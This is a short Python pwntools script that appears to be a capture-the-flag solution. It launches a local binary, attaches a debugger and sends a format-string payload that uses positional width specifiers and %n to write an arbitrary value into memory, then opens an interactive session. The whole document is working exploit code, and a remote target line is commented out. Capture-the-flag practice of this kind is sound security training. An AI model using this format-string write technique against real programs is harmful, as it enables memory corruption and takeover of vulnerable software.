from pwn import *

context(log_level = 'debug')

p = process('./ans')
# p = remote("10.212.27.23", 15329)
gdb.attach(p, 'b *$rebase(0x13AF)')
payload = "%*8$c%*9$c%11$n"
p.recvuntil('bro?\n')

p.sendline(payload)
p.recvuntil('gift.\n')
p.sendline(b'1')
p.interactive()
